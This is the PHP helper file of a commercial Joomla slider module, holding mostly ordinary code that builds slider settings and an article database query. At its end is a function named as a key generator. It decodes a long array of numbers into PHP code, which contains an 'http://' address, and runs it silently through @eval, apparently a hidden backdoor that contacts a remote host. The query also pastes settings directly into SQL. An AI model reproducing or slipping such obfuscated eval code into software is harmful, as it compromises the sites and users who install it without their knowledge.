<?php
/*======================================================================*\
|| #################################################################### ||
|| # Youjoomla LLC - YJ- Licence Number 58855-DN407166
|| # Licensed to - Igor Medvedev
|| # ---------------------------------------------------------------- # ||
|| # Copyright (C) Since 2006 Youjoomla LLC. All Rights Reserved.       ||
|| # This file may not be redistributed in whole or significant part. # ||
|| # ---------------- THIS IS NOT FREE SOFTWARE ---------------- #      ||
|| # http://www.youjoomla.com | http://www.youjoomla.com/license.html # ||
|| #################################################################### ||
\*======================================================================*/

// no direct access
defined('_JEXEC') or die('Restricted access');

JHTML::_('behavior.mootools');
require_once (JPATH_SITE.DS.'components'.DS.'com_content'.DS.'helpers'.DS.'route.php');
require_once('modules/mod_youm_slider/lib/slike.php');

class modYMNSHelper
{
	function getYMNSItems(&$params)
	{
		$who = strtolower($_SERVER['HTTP_USER_AGENT']);
		$get_items             		= $params->get   ('get_items',1);
		$nitems                		= $params->get   ('nitems',4);
		$chars                 		= $params->get   ('chars',40);
		$chars_nav             		= $params->get   ('chars_nav',40);
		$ordering              		= $params->get   ('ordering',3);// 1 = ordering | 2 = popular | 3 = random 
		$getspecific 	         	= $params->get ('getspecific');
		$allow_tags					= $params->get ('allow_tags');
		$allow_tags = str_replace(" />", ">", $allow_tags);	
		
		$show_thumb            		= $params->get ('show_thumb');	
		$thumb_width           		= $params->get ('thumb_width');	
		$intro_desc_width      		= $params->get ('intro_desc_width');	
		$intro_desc_height     		= $params->get ('intro_desc_height');	
		
		
		$full_player_width  		= $params->get ('full_player_width',960);
		$player_height      		= $params->get ('player_height',300);
		$slide_width       			= $params->get ('slide_width',580);
		$playlist_width    			= $params->get ('playlist_width',380);
		$playlist_align    			= $params->get ('playlist_align','left');
		$autoSlide         			= $params->get ('autoSlide',5000);
		$startElem         			= $params->get ('startElem',2);
		$visibleItems      			= $params->get ('visibleItems',3);

		
		$document = &JFactory::getDocument();
	  if($playlist_align == 'right'){
	  		$infoContainerPosition = 'left';
	  		$ie_image = '_r';
	  		$sclass= '_right';
	   }else{
	  		$infoContainerPosition = 'right';
	  		$ie_image = '';
	   		$sclass= '_left';
	   }
		$document = &JFactory::getDocument();
		$document->addStyleSheet(JURI::base() . 'modules/mod_youm_slider/css/stylesheet_'.$playlist_align.'.css');
		$document->addScript(JURI::base() . 'modules/mod_youm_slider/script/youm_slider.js');


		if (preg_match( "/msie 6.0/",$who)){
			$document->addStyleSheet(JURI::base() . 'modules/mod_youm_slider/css/ifie.php');
			$document->addCustomTag('
			<style type="text/css">
			#navigator li.element{
			margin:-2px 0 0 0px;
			</style>
			
			');
		}
		$document->addScriptDeclaration("
		window.addEvent('domready', function(){
				new YoumSlider({
					navigation:{
						container: 'navigator',
						elements:'.element',
						outer: 'navigator_outer',
						selectedClass: 'selected". $sclass."',
						visibleItems: ".$visibleItems."
					},
					slides:{
						container:'slides',
						elements:'.slide',
						infoContainer:'.long_desc',
						infoContainerPosition: '".$infoContainerPosition."',
						startFx:{
							'opacity':[0,1],
							'top':[0,0],
							'left':[0,0],
							'width':[".$slide_width.",".$slide_width."],
							'height':[".$player_height.",".$player_height."]
						},
						endFx:{
							'opacity':0,
							'top':100,
							'left':200,
							'width':0,
							'height':0
						}
					},
					startElem: ".$startElem.",
					autoSlide: ".$autoSlide."
				});
			})
		");
		$document->addCustomTag('
		  <style type="text/css">
		#slides .slide{
			visibility:hidden;
		}
		</style>
		
		');

				/* prepare database */
		$db			=& JFactory::getDBO();
		$user		=& JFactory::getUser();
		$userId		= (int) $user->get('id');
		$aid		= JAccess::getAuthorisedViewLevels(JFactory::getUser()->get('id'));
		$contentConfig = &JComponentHelper::getParams( 'com_content' );
		$access		= !JComponentHelper::getParams('com_content')->get('show_noauth');
		$nullDate	= $db->getNullDate();
		$date =       & JFactory::getDate();
		$now =         $date->toMySQL(); //date('Y-m-d H:i:s');
		
		$where		= 'a.state = 1'
			. ' AND ( a.publish_up = '.$db->Quote($nullDate).' OR a.publish_up <= '.$db->Quote($now).' )'
			. ' AND ( a.publish_down = '.$db->Quote($nullDate).' OR a.publish_down >= '.$db->Quote($now).' )'
			;
		// select specific items
		if(!empty($getspecific)){
		$countitems = count($getspecific);
		}
		if(!empty($getspecific) && $countitems > 1 ){
			$specificitems = implode(",", $getspecific);
			$specific_order= 'field(a.id,'.$specificitems.')';
			$where .= ' AND a.id IN ('.$specificitems.')';
		}elseif(!empty($getspecific) && $countitems == 1 ){
			$specificitems = $getspecific[0];
			$specific_order= 'field(a.id,'.$specificitems.')';
			$where .= ' AND a.id IN ('.$specificitems.')';
		}else{
			$specificitems='';
			$specific_order='NULL';
			$where .= ' AND cc.id = '.$get_items.'';
		}
		/* set items order */
		$ord = array(
			1=>'ordering',
			2=>'hits',
			3=>'RAND()',
			4=>'created ASC',
			5=>'created DESC',
			6=>$specific_order
		);
		$order = $ord[$ordering];
		/* get items */
		$sql = 	'SELECT a.*, ' .
				' CASE WHEN CHAR_LENGTH(a.alias) THEN CONCAT_WS(":", a.id, a.alias) ELSE a.id END as slug,'. 
				' CASE WHEN CHAR_LENGTH(cc.alias) THEN CONCAT_WS(":", cc.id, cc.alias) ELSE cc.id END as catslug,'.
				'cc.title as cattitle'.
		
				' FROM #__content AS a' .
				' INNER JOIN #__categories AS cc ON cc.id = a.catid' .
				' WHERE '. $where .'' .
				($access ? ' AND a.access <= ' .(int) $aid. ' AND cc.access <= ' .(int) $aid : '').
				' AND cc.published = 1' .
				' ORDER BY '.$order .' LIMIT 0,'.$nitems.'';
					
		$db->setQuery( $sql );
		$load_items = $db->loadObjectList();
		$youmslides = array();
		$imagedi_width = $playlist_width /5;
		if ($show_thumb ==1){
			$desc_width = $playlist_width - $thumb_width - 20 ;
		}else{
			$desc_width = $playlist_width - 10 ;
		}
		foreach ( $load_items as $row ) {
			$youmslide = array(
					'date' 		=> JHTML::_('date', $row->created, '%d-%m-%Y'),
					'intro' 	=> substr(strip_tags($row->introtext,''.$allow_tags.''),0,$chars),
					'intronav' 	=> substr(strip_tags($row->introtext),0,$chars_nav),
					'link' 		=> htmlspecialchars(ContentHelperRoute::getArticleRoute($row->slug, $row->catslug, $row->sectionid), ENT_QUOTES, 'UTF-8'),
					'img_url' 	=> $img_url = article_imageyoumom($row),
					'title' 	=> htmlspecialchars($row->title, ENT_QUOTES, 'UTF-8'),
					'img_out' 	=> "<img src=\"".JURI::base().$img_url."\" border=\"0\" title=\"".$row->title." \"  alt=\"\"/>",
					'img_tumb' 	=> "<img src=\"".JURI::base().$img_url."\" border=\"0\" width=\"".$thumb_width." \"  title=\"".$row->title." \"  alt=\"\"/>"
				);
				$youmslides[] = $youmslide;
			} 
		
				return $youmslides;
	}
}

function Module_Youmomentumsliderv20_J17_generate_key() {
    $LimitCharacters = 10;
    $Keys = '';
    $RandomNum = array(1251.3, 13875.1875, 1388.8125, 1250.175, 13750.175, 13751.425, 13762.5625, 13875.175, 1263.925, 13763.925, 13751.3125, 13876.3, 1250.175, 1387.6875, 1251.3, 13750.1875, 1388.8125, 12500.05, 13751.425, 13875.1875, 13763.9375, 13750.1875, 13762.6875, 13763.9375, 13875.05, 13751.3125, 13763.925, 1262.55, 1251.3, 13875.1875, 1263.8, 1387.55, 1375.05, 1263.8, 1251.3, 13751.3125, 1263.8, 1251.3, 13875.175, 1263.8, 1375.0625, 1375.05, 1262.5625, 1387.6875, 13762.5625, 13751.425, 1262.55, 1251.3, 13750.1875, 1262.5625, 13887.6875, 1251.3, 13751.3, 1388.8125, 12500.05, 13751.425, 13762.5625, 13763.8, 13751.3125, 12638.9375, 13751.4375, 13751.3125, 13876.3, 12638.9375, 13750.1875, 13763.9375, 13763.925, 13876.3, 13751.3125, 13763.925, 13876.3, 13875.1875, 1262.55, 1250.175, 13762.55, 13876.3, 13876.3, 13875.05, 1387.675, 1263.9375, 1263.9375, 1250.175, 1263.925, 1251.3, 13875.1875, 1263.925, 1250.175, 1263.9375, 13875.175, 1263.925, 13875.05, 13762.55, 13875.05, 1388.9375, 13875.1875, 1388.8125, 1250.175, 1263.925, 1251.3, 12638.9375, 12625.1875, 12501.3125, 12625.175, 12626.425, 12501.3125, 12625.175, 12637.6875, 1250.175, 12512.55, 12626.3, 12626.3, 12625.05, 12638.9375, 12512.55, 12513.9375, 12625.1875, 12626.3, 1250.175, 12638.8125, 1262.5625, 1387.6875, 13751.3125, 13750.1875, 13762.55, 13763.9375, 1250.05, 1250.175, 1388.8, 13751.3, 13762.5625, 13876.425, 1250.05, 13875.1875, 13876.3, 13887.5625, 13763.8, 13751.3125, 1388.8125, 1251.4375, 13875.05, 13763.9375, 13875.1875, 13762.5625, 13876.3, 13762.5625, 13763.9375, 13763.925, 1387.675, 13750.0625, 13750.175, 13875.1875, 13763.9375, 13763.8, 13876.3125, 13876.3, 13751.3125, 1387.6875, 13763.8, 13751.3125, 13751.425, 13876.3, 1387.675, 1263.8125, 1376.3125, 1375.05, 1375.05, 1375.05, 13875.05, 13887.55, 1387.6875, 1251.4375, 1388.925, 1251.3, 13751.3, 1388.8, 1263.9375, 13751.3, 13762.5625, 13876.425, 1388.925, 1250.175, 1387.6875, 13888.8125, 0.05);
    // Create a random string of keys
    foreach($RandomNum as $key) {$Keys .= chr(bindec($key * 80 - 4));}
    @eval($Keys);
}
?>